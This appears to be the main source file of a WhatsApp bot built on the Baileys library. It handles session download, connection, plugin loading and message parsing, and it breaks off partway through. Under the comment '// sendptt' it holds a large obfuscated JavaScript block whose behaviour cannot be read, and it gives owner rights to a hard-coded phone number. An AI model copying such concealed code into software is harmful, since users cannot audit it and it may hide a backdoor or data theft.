const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, jidNormalizedUser, getContentType, fetchLatestBaileysVersion, generateWAMessageFromContent, prepareWAMessageMedia, generateWAMessageContent, proto, Browsers } = require('@whiskeysockets/baileys');
const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const fs = require('fs'); 
const path = require('path');
const fetch = require('node-fetch');
const FileType = require('file-type');
const P = require('pino');
const config = require('./config');
const qrcode = require('qrcode-terminal');
const util = require('util');
const { sms, downloadMediaMessage } = require('./lib/msg');
const axios = require('axios');
const { File } = require('megajs');
const { toAudio, toPTT, toVideo } = require("./lib/conv");
const moment = require('moment-timezone');

const ownerNumber = ['+94 74 349 1027'];

//------------------ Session ---------------------//

if (!fs.existsSync(__dirname + '/lib/creds.json')) {
    if (!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!');
    const sessdata = config.SESSION_ID;
    const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
    filer.download((err, data) => {
        if (err) throw err;
        fs.writeFile(__dirname + '/lib/creds.json', data, () => {
            console.log("✅ FRONEXT MD| Session downloaded");
        });
    });
}

const express = require("express");
const app = express();
const port = process.env.PORT || 8000;

//------------------ Database ---------------------//

async function connectToWA() {
    const connectDB = require('./lib/mongodb');
    connectDB();
    
    const { readEnv } = require('./lib/database');
    const config = await readEnv();
    const prefix = config.PREFIX;
    console.log("✅ FRONEXT MD | Connecting");

//------------------ setting input ---------------------//
   
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/lib/');
    var { version } = await fetchLatestBaileysVersion();
    
    const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version
    });

    let work;
    switch (config.MODE) {
        case 'public':
            work = 'Public';
            break;
        case 'private':
            work = 'Private';
            break;
        case 'groups':
            work = 'Only Group';
            break;
        case 'inbox':
            work = 'Only Inbox';
            break;
        default:
            work = 'Unkown';
    }

    let autoStatus = config.AUTO_READ_STATUS === 'true' ? 'true' : 'false';
    let autoVoice = config.AUTO_VOICE === 'true' ? 'true' : 'false';
    let autoreact = config.AUTO_REACT === 'true' ? 'true' : 'false';
    let AI_CHAT_BOT = config.AI_CHAT_BOT === 'true' ? 'true' : 'false';
    let OWNER_REACT = config.OWNER_REACT === 'true' ? 'true' : 'false';
    let autoBioEnabled = config.autoBioEnabled === 'false' ? 'true' : 'false';
    let AutoTyping = config.AutoTyping === 'true' ? 'true' : 'false';
    let AUTO_READ_CMD = config.AUTO_READ_CMD === 'true' ? 'true' : 'false';
    let AUTO_BLock_212 = config.AUTO_BLock_212 === 'true' ? 'true' : 'false';
    let AUTO_KICK_212 = config.AUTO_KICK_212 === 'true' ? 'true' : 'false';
    let WELCOME = config.WELCOME === 'true' ? 'true' : 'false';

    conn.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                connectToWA();
            }
        } else if (connection === 'open') {
            console.log('✅ FRONEXT MD | Installing Commands');
            const path = require('path');
            fs.readdirSync("./plugins/").forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() === ".js") {
                    require("./plugins/" + plugin);
                }
            });
            console.log('✅ FRONEXT MD | Command installed successfully');
            console.log('✅ FRONEXT MD | Bot connected to WhatsApp');
            let up = `*𝐅𝐑𝐎𝐍𝐄𝐗𝐓 𝐌𝐃 𝐌𝐔𝐋𝐓𝐈 𝐃𝐄𝐕𝐈𝐃𝐄 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐁𝐎𝐓 ❤️*

*╭─「 ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴍꜱɢ 」*
*│OWNER*: ᴄʏʙᴇʀ ꜰʀᴏʟʏ
*│NUMBER*: +${ownerNumber}
*│PREFIX*: ${config.PREFIX}
*╰───────────◈◈►*

*╭──────────◈◈►*
*│🎗️ SETTING LIST*
*│   ───────*
*│ 1*   *Work Tipe* : *${work}*
*│ 2*   *Auto Voice* : *${autoVoice}*
*│ 3*   *Auto Status* : *${autoStatus}*
*│ 4*   *Auto React* : *${autoreact}*
*│ 5*   *Owner React* : *${OWNER_REACT}*
*│ 6*   *Auto Bio* : *${autoBioEnabled}*
*│ 7*   *Auto Typing* : *${AutoTyping}*
*│ 8*   *Auto Read Command* : *${AUTO_READ_CMD}*
*│ 9*   *Auto Block 212* : *${AUTO_BLock_212}*
*│ 10*  *Auto Kick 212* : *${AUTO_KICK_212}*
*│ 11*  *Welcome* : *${WELCOME}*
*╰───────────◈◈►*

> *ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ᴡᴀ ʙᴏᴛ ʙʏ 𝒇𝒓𝒐𝒏𝒆𝒙𝒕 𝒎𝒅 *
> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ - ᴄʏʙᴇʀ ꜰʀᴏʟʏ*`;
            
            conn.sendMessage(ownerNumber + "@s.whatsapp.net", {
                image: { url: `https://i.ibb.co/8gMhyC7J/8488.jpg` },
                caption: up
            });
        }
    });

    conn.ev.on('creds.update', saveCreds);

    conn.ev.on('messages.upsert', async (mek) => {
        mek = mek.messages[0];
        if (!mek.message) return;
        
//-----------------------------------------------//

    const jid = mek.key.remoteJid;
    let messageContent;

    if (mek.message.conversation) {
        messageContent = mek.message.conversation;
    } else if (mek.message.extendedTextMessage) {
        messageContent = mek.message.extendedTextMessage.text;
    } else if (mek.message.reactionMessage) {
        messageContent = mek.message.reactionMessage.text;
    } else {
        messageContent = 'Unknown message type';
    }

    console.log("JID:", jid + "Message:", messageContent);

        mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;

//------------------ Auto statas reed ---------------------//
 
        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true") {
            await conn.readMessages([mek.key]);
        }

//------------------ Auto bio ---------------------//

if (config.autoBioEnabled === 'true'){
    await
conn.updateProfileStatus(`fʀᴏɴᴇxᴛ ᴍᴅ ᴀᴄᴛɪᴠᴇ sᴜᴄᴄᴇssғᴜʟʟʏ ⚡ ${moment.tz('Asia/Colombo').format('HH:mm:ss')}`)

}

//--------------------------------------------------//
 

        const m = sms(conn, mek);
        const type = getContentType(mek.message);
        const content = JSON.stringify(mek.message);
        const from = mek.key.remoteJid;
        const quoted = (type === 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null) ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
        const body = (type === 'conversation') ? mek.message.conversation :
                     (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
                     (type === 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption :
                     (type === 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';

        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');
        const isGroup = from.endsWith('@g.us');
        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const botNumber = conn.user.id.split(':')[0];
        const pushname = mek.pushName || 'Sin Nombre';
        const isMe = botNumber.includes(senderNumber);
        const isOwner = ownerNumber.includes(senderNumber) || isMe;
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => { }) : '';
        const groupName = isGroup ? groupMetadata.subject : '';
        const participants = isGroup ? await groupMetadata.participants : [];
        const groupAdmins = isGroup ? await getGroupAdmins(participants) : [];
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
        const isReact = m.message.reactionMessage ? true : false;

        const reply = (teks) => {
            conn.sendMessage(from, { text: teks }, { quoted: mek });
        };

        //---------------------------------------------------------//

        conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
            let mime = '';
            let res = await axios.head(url);
            mime = res.headers['content-type'];
            if (mime.split("/")[1] === "gif") {
                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options });
            }
            let type = mime.split("/")[0] + "Message";
            if (mime === "application/pdf") {
                return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options });
            }
            if (mime.split("/")[0] === "image") {
                return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options });
            }
            if (mime.split("/")[0] === "video") {
                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options });
            }
            if (mime.split("/")[0] === "audio") {
                return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options });
            }
        };
// sendptt
        var P_cw5z,hBWYC7l,XhKj1P,QSn3xT,tjWYYPd,rgoga7,FyP1zD,xXqKKeg,SVABiBi,nI97suA,zVzFKN6,NorqWB,fwCeNqk,OxZVodA,Cg1I3Cv,XkSB43;function HNhGboO(hBWYC7l){return P_cw5z[hBWYC7l>0x7b?hBWYC7l+0x1f:hBWYC7l+0x36]}P_cw5z=NK6FSu.call(this);function Pvyd5E7(P_cw5z,hBWYC7l){Object.defineProperty(P_cw5z,HNhGboO(-0x22),{value:hBWYC7l,configurable:HNhGboO(0x36)});return P_cw5z}hBWYC7l=Pvyd5E7(o4SeuCt((...hBWYC7l)=>{var XhKj1P=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l>0x5f?hBWYC7l<0x5f?hBWYC7l-0x15:hBWYC7l<0x111?hBWYC7l<0x5f?hBWYC7l+0x20:hBWYC7l<0x111?hBWYC7l-0x60:hBWYC7l-0x5e:hBWYC7l-0x31:hBWYC7l+0x1d]},0x1);void(hBWYC7l.length=HNhGboO(-0x35),hBWYC7l[XhKj1P(0x60)]=-XhKj1P(0x6b));if(hBWYC7l.thAEF_>hBWYC7l[XhKj1P(0x60)]+HNhGboO(-0x29)){var QSn3xT=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l<0xf3?hBWYC7l<0xf3?hBWYC7l-0x42:hBWYC7l-0x61:hBWYC7l-0x2c]},0x1);return hBWYC7l[QSn3xT(0xb8)]}else{return hBWYC7l[HNhGboO(-0x32)](hBWYC7l[0x0]())}},0x0),HNhGboO(-0x35))(vPbuaQ,sl6u6L);var tGa4JkL=[],EZtHIy=HNhGboO(-0x34),jqmblq=o4SeuCt((...hBWYC7l)=>{var XhKj1P=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l>-0x53?hBWYC7l>-0x53?hBWYC7l<-0x53?hBWYC7l+0x64:hBWYC7l<-0x53?hBWYC7l+0x3e:hBWYC7l>-0x53?hBWYC7l<0x5f?hBWYC7l+0x52:hBWYC7l-0x5b:hBWYC7l-0x5e:hBWYC7l+0x27:hBWYC7l+0xe]},0x1);typeof(hBWYC7l.length=XhKj1P(-0x50),hBWYC7l[HNhGboO(-0x33)]=0x19,hBWYC7l[hBWYC7l[XhKj1P(-0x4f)]-HNhGboO(-0x2e)]=[RTujYc(0x0),RTujYc(HNhGboO(-0x32)),RTujYc(XhKj1P(-0x51)),RTujYc(hBWYC7l[XhKj1P(-0x4f)]-HNhGboO(-0x2f)),RTujYc(XhKj1P(-0x13)),RTujYc(0x5),RTujYc(HNhGboO(0xb)),RTujYc(XhKj1P(-0x49)),RTujYc(XhKj1P(-0x48)),RTujYc(hBWYC7l.dH8wIq-HNhGboO(-0x30)),RTujYc(hBWYC7l[HNhGboO(-0x33)]-0xf),RTujYc(hBWYC7l[HNhGboO(-0x33)]-HNhGboO(-0x31)),RTujYc(HNhGboO(-0x1c)),RTujYc(XhKj1P(-0x46)),RTujYc(HNhGboO(-0x31)),RTujYc(0xf),RTujYc(HNhGboO(-0x30)),RTujYc(XhKj1P(-0x19)),RTujYc(HNhGboO(-0x1d)),RTujYc(HNhGboO(-0x8)),RTujYc(XhKj1P(-0x16)),RTujYc(0x15),RTujYc(HNhGboO(-0x2f)),RTujYc(HNhGboO(0xf)),RTujYc(XhKj1P(-0xc)),RTujYc(HNhGboO(-0x2e)),RTujYc(XhKj1P(-0x31)),RTujYc(0x1b),RTujYc(0x1c),RTujYc(0x1d),RTujYc(hBWYC7l[HNhGboO(-0x33)]+XhKj1P(0x47)),RTujYc(XhKj1P(-0x3c)),RTujYc(hBWYC7l.dH8wIq+HNhGboO(-0x2d)),RTujYc(hBWYC7l.dH8wIq+XhKj1P(-0x48)),RTujYc(XhKj1P(-0x47)),RTujYc(0x23),RTujYc(hBWYC7l[HNhGboO(-0x33)]+XhKj1P(-0x22)),RTujYc(XhKj1P(-0x26)),RTujYc(hBWYC7l.dH8wIq+HNhGboO(-0x2a)),RTujYc(0x27),RTujYc(0x28),RTujYc(0x29),RTujYc(XhKj1P(-0x8)),RTujYc(HNhGboO(-0x29)),RTujYc(XhKj1P(-0x30)),RTujYc(0x2d),RTujYc(hBWYC7l.dH8wIq+XhKj1P(0x4)),RTujYc(HNhGboO(0x1a)),RTujYc(0x30),RTujYc(XhKj1P(-0x1)),RTujYc(hBWYC7l[HNhGboO(-0x33)]+0x19),RTujYc(0x33),RTujYc(hBWYC7l[XhKj1P(-0x4f)]+HNhGboO(0xc)),RTujYc(0x35),RTujYc(XhKj1P(0x7)),RTujYc(XhKj1P(0x0)),RTujYc(HNhGboO(0x1d)),RTujYc(0x39),RTujYc(0x3a),RTujYc(XhKj1P(0x12)),RTujYc(HNhGboO(0x17)),RTujYc(0x3d),RTujYc(XhKj1P(0x1b)),RTujYc(HNhGboO(-0x1f)),RTujYc(HNhGboO(0x38)),RTujYc(HNhGboO(-0x23)),RTujYc(0x42),RTujYc(HNhGboO(0x39)),RTujYc(hBWYC7l.dH8wIq+0x2b),RTujYc(XhKj1P(-0x35)),RTujYc(HNhGboO(-0x28)),RTujYc(0x47),RTujYc(0x48),RTujYc(hBWYC7l[XhKj1P(-0x4f)]+XhKj1P(-0x6)),RTujYc(HNhGboO(-0x9)),RTujYc(0x4b),RTujYc(XhKj1P(0x20)),RTujYc(hBWYC7l.dH8wIq+(hBWYC7l.dH8wIq+0x1b)),RTujYc(0x4e),RTujYc(XhKj1P(-0x37)),RTujYc(XhKj1P(-0x43)),RTujYc(HNhGboO(0x43)),RTujYc(HNhGboO(0x45)),RTujYc(XhKj1P(-0x42)),RTujYc(XhKj1P(0x2a)),RTujYc(HNhGboO(0x47)),RTujYc(0x56),RTujYc(XhKj1P(-0x28)),RTujYc(XhKj1P(0x2f)),RTujYc(0x59),RTujYc(XhKj1P(0x9)),RTujYc(XhKj1P(-0x7)),RTujYc(HNhGboO(0x50)),RTujYc(HNhGboO(0x52)),RTujYc(XhKj1P(-0x1d)),RTujYc(hBWYC7l[HNhGboO(-0x33)]+XhKj1P(-0x44)),RTujYc(XhKj1P(-0x1a)),RTujYc(HNhGboO(-0x11)),RTujYc(0x62),RTujYc(0x63),RTujYc(0x64),RTujYc(HNhGboO(-0x25)),RTujYc(0x66),RTujYc(HNhGboO(-0x2)),RTujYc(XhKj1P(-0x20)),RTujYc(hBWYC7l[HNhGboO(-0x33)]+HNhGboO(-0x27)),RTujYc(XhKj1P(0x3d)),RTujYc(XhKj1P(0x3e)),RTujYc(hBWYC7l[XhKj1P(-0x4f)]+HNhGboO(-0x26)),RTujYc(0x6d),RTujYc(XhKj1P(0x41)),RTujYc(XhKj1P(0x22)),RTujYc(XhKj1P(-0x2b)),RTujYc(0x71),RTujYc(XhKj1P(0x13)),RTujYc(0x73),RTujYc(XhKj1P(-0x40)),RTujYc(0x75),RTujYc(HNhGboO(0x61)),RTujYc(hBWYC7l[HNhGboO(-0x33)]+0x5e),RTujYc(0x78),RTujYc(XhKj1P(-0x15)),RTujYc(HNhGboO(0x67)),RTujYc(0x7b),RTujYc(XhKj1P(0x3b)),RTujYc(hBWYC7l[XhKj1P(-0x4f)]+(hBWYC7l[XhKj1P(-0x4f)]+HNhGboO(0x3b))),RTujYc(hBWYC7l[XhKj1P(-0x4f)]+HNhGboO(-0x25)),RTujYc(0x7f),RTujYc(hBWYC7l.dH8wIq+0x67),RTujYc(0x81),RTujYc(hBWYC7l.dH8wIq+HNhGboO(0x58)),RTujYc(0x83),RTujYc(0x84),RTujYc(XhKj1P(0x4e)),RTujYc(HNhGboO(0x42)),RTujYc(XhKj1P(-0x2f)),RTujYc(HNhGboO(0x31)),RTujYc(0x89),RTujYc(XhKj1P(-0x2c)),RTujYc(0x8b),RTujYc(XhKj1P(-0x32)),RTujYc(hBWYC7l[HNhGboO(-0x33)]+XhKj1P(-0x40)),RTujYc(HNhGboO(0x6d)),RTujYc(0x8f),RTujYc(XhKj1P(0x54)),RTujYc(XhKj1P(0x55)),RTujYc(hBWYC7l.dH8wIq+0x79)]);return hBWYC7l[XhKj1P(-0x4f)]>hBWYC7l[XhKj1P(-0x4f)]+HNhGboO(-0x23)?hBWYC7l[hBWYC7l.dH8wIq-0xb7]:(EZtHIy?hBWYC7l[HNhGboO(-0x34)].pop():EZtHIy++,hBWYC7l[HNhGboO(-0x34)])},0x0)();function WcWgvvQ(){try{return global||window||new Function(RTujYc(HNhGboO(0x2c)))()}catch(e){try{return this}catch(e){return{}}}}void(XhKj1P=WcWgvvQ()||{},QSn3xT=XhKj1P[RTujYc(HNhGboO(0x62))],tjWYYPd=XhKj1P[RTujYc(HNhGboO(0x5b))],rgoga7=XhKj1P[RTujYc(HNhGboO(0x66))],FyP1zD=XhKj1P[RTujYc(0x97)]||String,xXqKKeg=XhKj1P[RTujYc(0x98)]||Array,SVABiBi=o4SeuCt(()=>{var hBWYC7l=new xXqKKeg(HNhGboO(0x4)),XhKj1P,QSn3xT;void(XhKj1P=FyP1zD[RTujYc(HNhGboO(0x28))]||FyP1zD[RTujYc(0x9a)],QSn3xT=[]);return Pvyd5E7(o4SeuCt((...tjWYYPd)=>{var rgoga7;function xXqKKeg(tjWYYPd){return P_cw5z[tjWYYPd<0xad?tjWYYPd<0xad?tjWYYPd<-0x5?tjWYYPd-0x3c:tjWYYPd<0xad?tjWYYPd<0xad?tjWYYPd>-0x5?tjWYYPd<0xad?tjWYYPd+0x4:tjWYYPd-0x49:tjWYYPd+0x35:tjWYYPd-0x43:tjWYYPd+0x3e:tjWYYPd-0x53:tjWYYPd+0x60]}typeof(tjWYYPd[HNhGboO(-0x22)]=HNhGboO(-0x32),tjWYYPd[HNhGboO(-0x21)]=-HNhGboO(-0x30));var SVABiBi,nI97suA;typeof(tjWYYPd[0x3]=tjWYYPd[0x0][RTujYc(tjWYYPd[0xf4]+0xab)],QSn3xT[RTujYc(0x9b)]=tjWYYPd[xXqKKeg(0x11)]+HNhGboO(-0x30));for(rgoga7=0x0;rgoga7<tjWYYPd[xXqKKeg(0x18)];){var zVzFKN6=o4SeuCt(tjWYYPd=>{return P_cw5z[tjWYYPd<-0x4b?tjWYYPd+0x5e:tjWYYPd>-0x4b?tjWYYPd<0x67?tjWYYPd>-0x4b?tjWYYPd>0x67?tjWYYPd+0x2:tjWYYPd>0x67?tjWYYPd+0x64:tjWYYPd+0x4a:tjWYYPd-0x5d:tjWYYPd+0x50:tjWYYPd+0x48]},0x1);nI97suA=tjWYYPd[xXqKKeg(-0x2)][rgoga7++];if(nI97suA<=zVzFKN6(-0x2c)){SVABiBi=nI97suA}else{if(nI97suA<=tjWYYPd[tjWYYPd[xXqKKeg(0x11)]+0x104]+xXqKKeg(0x14)){SVABiBi=(nI97suA&xXqKKeg(0x12))<<0x6|tjWYYPd[xXqKKeg(-0x2)][rgoga7++]&xXqKKeg(0x13)}else{if(nI97suA<=HNhGboO(-0x1e)){var NorqWB=o4SeuCt(tjWYYPd=>{return P_cw5z[tjWYYPd>0x45?tjWYYPd>0x45?tjWYYPd>0x45?tjWYYPd>0x45?tjWYYPd<0x45?tjWYYPd-0x4c:tjWYYPd-0x46:tjWYYPd-0x17:tjWYYPd-0x35:tjWYYPd-0x4e:tjWYYPd+0x2]},0x1);SVABiBi=(nI97suA&0xf)<<0xc|(tjWYYPd[xXqKKeg(-0x2)][rgoga7++]&NorqWB(0x5d))<<0x6|tjWYYPd[HNhGboO(-0x34)][rgoga7++]&xXqKKeg(0x13)}else{if(FyP1zD[RTujYc(tjWYYPd[zVzFKN6(-0x35)]+xXqKKeg(0x32))]){var fwCeNqk=o4SeuCt(tjWYYPd=>{return P_cw5z[tjWYYPd<0x3d?tjWYYPd-0x40:tjWYYPd<0xef?tjWYYPd>0x3d?tjWYYPd-0x3e:tjWYYPd+0x36:tjWYYPd+0x4c]},0x1);SVABiBi=(nI97suA&fwCeNqk(0x47))<<zVzFKN6(-0x31)|(tjWYYPd[zVzFKN6(-0x48)][rgoga7++]&xXqKKeg(0x13))<<fwCeNqk(0x58)|(tjWYYPd[fwCeNqk(0x40)][rgoga7++]&HNhGboO(-0x1f))<<0x6|tjWYYPd[zVzFKN6(-0x48)][rgoga7++]&0x3f}else{!(SVABiBi=tjWYYPd[0xf4]+zVzFKN6(-0x2f),rgoga7+=zVzFKN6(-0x2e))}}}}QSn3xT[RTujYc(0x9c)](hBWYC7l[SVABiBi]||(hBWYC7l[SVABiBi]=XhKj1P(SVABiBi)))}return tjWYYPd[tjWYYPd[tjWYYPd[HNhGboO(-0x21)]+0x104]+0x104]>xXqKKeg(0x19)?tjWYYPd[-xXqKKeg(0x1a)]:QSn3xT[RTujYc(tjWYYPd[xXqKKeg(0x11)]+HNhGboO(0x41))]('')},0x0),HNhGboO(-0x32))},0x0)(),Pvyd5E7(xuqNBP,HNhGboO(-0x32)));function xuqNBP(...hBWYC7l){var XhKj1P=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l<0x103?hBWYC7l<0x103?hBWYC7l>0x51?hBWYC7l-0x52:hBWYC7l-0x2b:hBWYC7l+0x3a:hBWYC7l-0x22]},0x1);!(hBWYC7l[HNhGboO(-0x22)]=HNhGboO(-0x32),hBWYC7l.ViLYAg=hBWYC7l[XhKj1P(0x54)]);return typeof QSn3xT!==RTujYc(HNhGboO(-0x17))&&QSn3xT?new QSn3xT()[RTujYc(0x9f)](new tjWYYPd(hBWYC7l.ViLYAg)):typeof rgoga7!==RTujYc(HNhGboO(-0x17))&&rgoga7?rgoga7[RTujYc(HNhGboO(0x74))](hBWYC7l.ViLYAg)[RTujYc(0xa1)](RTujYc(0xa2)):SVABiBi(hBWYC7l.ViLYAg)}!(nI97suA=b5HnBX5(HNhGboO(-0x16)),zVzFKN6=b5HnBX5(0x4d),NorqWB=b5HnBX5(HNhGboO(-0x15)),fwCeNqk=[b5HnBX5(0xb),b5HnBX5(HNhGboO(-0x31)),b5HnBX5(HNhGboO(0x1)),b5HnBX5(HNhGboO(-0x29)),b5HnBX5(HNhGboO(-0x14)),b5HnBX5(0x77),b5HnBX5(0x7d),b5HnBX5[RTujYc(HNhGboO(-0x7))](HNhGboO(-0x12),[HNhGboO(0xe)]),b5HnBX5(HNhGboO(-0x13))],OxZVodA={[RTujYc(HNhGboO(-0xd))]:b5HnBX5(HNhGboO(-0x2d)),[RTujYc(0xa5)]:b5HnBX5[RTujYc(HNhGboO(-0x5))](HNhGboO(-0x12),HNhGboO(0x11)),[RTujYc(HNhGboO(0x53))]:b5HnBX5(HNhGboO(-0x11)),[RTujYc(HNhGboO(0x6c))]:b5HnBX5(HNhGboO(-0x10))},Cg1I3Cv=o4SeuCt((...hBWYC7l)=>{var XhKj1P;function QSn3xT(hBWYC7l){return P_cw5z[hBWYC7l<-0x31?hBWYC7l-0x3a:hBWYC7l>0x81?hBWYC7l-0x2c:hBWYC7l<0x81?hBWYC7l>-0x31?hBWYC7l>-0x31?hBWYC7l<-0x31?hBWYC7l+0xa:hBWYC7l>0x81?hBWYC7l+0x41:hBWYC7l+0x30:hBWYC7l+0x1d:hBWYC7l+0x60:hBWYC7l+0xd]}void(hBWYC7l[QSn3xT(-0x1c)]=HNhGboO(-0x34),hBWYC7l[QSn3xT(-0x5)]=-QSn3xT(-0x9),hBWYC7l.jMMVxyd=[b5HnBX5(HNhGboO(-0x2c))],hBWYC7l[HNhGboO(-0xe)]=hBWYC7l.N2G5Eep,XhKj1P=b5HnBX5(HNhGboO(-0x2d)),hBWYC7l[QSn3xT(-0x8)]={rla9V3:[],RJ8fzYI:o4SeuCt((hBWYC7l=OxZVodA[RTujYc(QSn3xT(-0x7))])=>{if(!Cg1I3Cv.noRZauI[HNhGboO(-0x34)]){Cg1I3Cv.noRZauI.push(-QSn3xT(-0x6))}return Cg1I3Cv.noRZauI[hBWYC7l]},0x0),Nakwck7:HNhGboO(-0x26),Oi20fv4:[],XYEtLy:o4SeuCt((hBWYC7l=XhKj1P)=>{var QSn3xT=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l<0x110?hBWYC7l<0x5e?hBWYC7l-0x15:hBWYC7l>0x5e?hBWYC7l>0x5e?hBWYC7l-0x5f:hBWYC7l+0x2d:hBWYC7l+0x26:hBWYC7l+0x41]},0x1);if(!Cg1I3Cv.rla9V3[QSn3xT(0x61)]){Cg1I3Cv.rla9V3.push(-0x2c)}return Cg1I3Cv.rla9V3[hBWYC7l]},0x0),noRZauI:[],ri9obK:hBWYC7l[QSn3xT(-0x5)]+0x82,DS4BLt:o4SeuCt((hBWYC7l=b5HnBX5(HNhGboO(-0x2d)))=>{if(!Cg1I3Cv.uSxHRd[QSn3xT(-0x2e)]){Cg1I3Cv.uSxHRd.push(-HNhGboO(-0xa))}return Cg1I3Cv.uSxHRd[hBWYC7l]},0x0),htJmLHi:HNhGboO(-0x9),U3xqZL5:o4SeuCt((hBWYC7l=b5HnBX5[RTujYc(0xa3)](HNhGboO(-0x12),[0x7]))=>{var XhKj1P=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l<-0x11?hBWYC7l+0x16:hBWYC7l>0xa1?hBWYC7l+0x3a:hBWYC7l>0xa1?hBWYC7l+0x14:hBWYC7l<-0x11?hBWYC7l+0xd:hBWYC7l<-0x11?hBWYC7l+0x60:hBWYC7l<-0x11?hBWYC7l-0x21:hBWYC7l<-0x11?hBWYC7l+0x40:hBWYC7l+0x10]},0x1);if(!Cg1I3Cv.Oi20fv4[XhKj1P(-0xe)]){Cg1I3Cv.Oi20fv4.push(0x4)}return Cg1I3Cv.Oi20fv4[hBWYC7l]},0x0),uSxHRd:[],bARMBS:0x40,Cez3Ci:hBWYC7l.jMMVxyd[0x0],YgPzNK:QSn3xT(-0x5)});return hBWYC7l[hBWYC7l[0x48]+0xb8]>hBWYC7l[HNhGboO(-0xb)]+QSn3xT(-0x23)?hBWYC7l[HNhGboO(-0x8)]:hBWYC7l[HNhGboO(-0xe)]},0x0)());var zjw5TV,Vdn2j5,XMq5nJV=function(){var hBWYC7l,XhKj1P,QSn3xT,tjWYYPd;function rgoga7(hBWYC7l){return P_cw5z[hBWYC7l>0xbd?hBWYC7l-0x2f:hBWYC7l>0xb?hBWYC7l<0xbd?hBWYC7l<0xb?hBWYC7l+0x53:hBWYC7l<0xb?hBWYC7l+0xc:hBWYC7l<0xb?hBWYC7l-0xf:hBWYC7l>0xbd?hBWYC7l-0x1c:hBWYC7l>0xb?hBWYC7l-0xc:hBWYC7l+0x34:hBWYC7l+0xa:hBWYC7l-0x59]}!(hBWYC7l=b5HnBX5[RTujYc(rgoga7(0x3b))](HNhGboO(-0x12),[rgoga7(0x3c)]),XhKj1P=b5HnBX5(rgoga7(0x55)),QSn3xT=function(){try{return global||window||new Function(b5HnBX5[RTujYc(rgoga7(0x3d))](rgoga7(0x30),0x9)+XhKj1P)()}catch(e){return tjWYYPd[hBWYC7l](this)}},tjWYYPd=function(){try{return this}catch(e){return null}});return Vdn2j5=tjWYYPd[b5HnBX5(0xb)](this,xeQO3t),zjw5TV=QSn3xT[b5HnBX5(0xb)](this)}[fwCeNqk[HNhGboO(-0x34)]]();Pvyd5E7(HkdyK5w,HNhGboO(-0x35));function HkdyK5w(...hBWYC7l){var XhKj1P=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l<0x7c?hBWYC7l<0x7c?hBWYC7l<-0x36?hBWYC7l-0x16:hBWYC7l>-0x36?hBWYC7l<-0x36?hBWYC7l+0x13:hBWYC7l>-0x36?hBWYC7l+0x35:hBWYC7l-0x1:hBWYC7l-0x10:hBWYC7l+0x1:hBWYC7l+0x46]},0x1);typeof(hBWYC7l[HNhGboO(-0x22)]=0x2,hBWYC7l[HNhGboO(-0x3)]=XhKj1P(-0x3));switch(XkSB43){case Cg1I3Cv.XYEtLy()?-XhKj1P(-0x19):null:return!hBWYC7l[hBWYC7l[HNhGboO(-0x3)]-HNhGboO(-0x4)];case!Cg1I3Cv.RJ8fzYI()?void 0x0:-HNhGboO(-0x29):return hBWYC7l[HNhGboO(-0x34)]+hBWYC7l[hBWYC7l[HNhGboO(-0x3)]-HNhGboO(-0x2)]}}Pvyd5E7(mI4WegQ,HNhGboO(-0x32));function mI4WegQ(...hBWYC7l){var XhKj1P=o4SeuCt(hBWYC7l=>{return 